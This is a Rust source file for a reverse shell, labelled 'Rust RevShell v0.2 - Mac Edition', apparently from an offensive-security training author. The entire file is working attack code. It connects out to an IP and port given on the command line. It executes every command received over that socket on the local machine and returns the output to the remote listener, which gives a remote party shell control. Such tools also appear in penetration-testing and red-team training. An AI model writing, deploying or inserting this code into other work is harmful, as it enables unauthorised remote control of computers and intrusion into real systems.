use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::io::{Read, Write};

fn main() {
    // Get the user-provided IP address and port
    //let ip = "127.0.0.1";
    //let port = "1234";

    //collect port and ip from command line
    let args: Vec<String> = std::env::args().collect();
        //if less than 3 arguments, print help and exit
        if args.len() < 3 {
            println!("Usage: {} <ip> <port>", args[0]);
            std::process::exit(1);
        }
    let ip = &args[1];
    let port = &args[2];

    // Print the banner and connect message to the user (you should probably change this :D )
    println!("\u{1b}[32mRust RevShell v0.2 - Mac Edition");
    println!("\u{1b}[32mBy: @Teach2Breach");
    println!("\u{1b}[33mConnecting to {} on port {}", ip, port);

    // Create a TCP stream to the given address
    let mut stream = TcpStream::connect(format!("{}:{}", ip, port)).expect("Failed to connect");

    // Wait for shell commands to be sent
    loop {
        let mut buf = [0; 1024];
        match stream.read(&mut buf) {
            Ok(n) => {
                // Execute the received command and redirect the output to the netcat listener

                //convert the buffer to a string for sending to Command
                let cmd = String::from_utf8_lossy(&buf[0..n]);
                //let cmd_string = cmd.to_string();
                let mut output = Command::new(cmd.trim())
                    .stdout(Stdio::piped())
                    .spawn()
                    .expect("Failed to execute command")
                    .stdout
                    .expect("Failed to get command output");

                let mut output_vec = Vec::new();
                output.read_to_end(&mut output_vec).expect("Failed to read command output");
                stream.write(&output_vec).expect("Failed to write to stream");
            }
            Err(err) => println!("Error: {}", err),
        }
    }
}
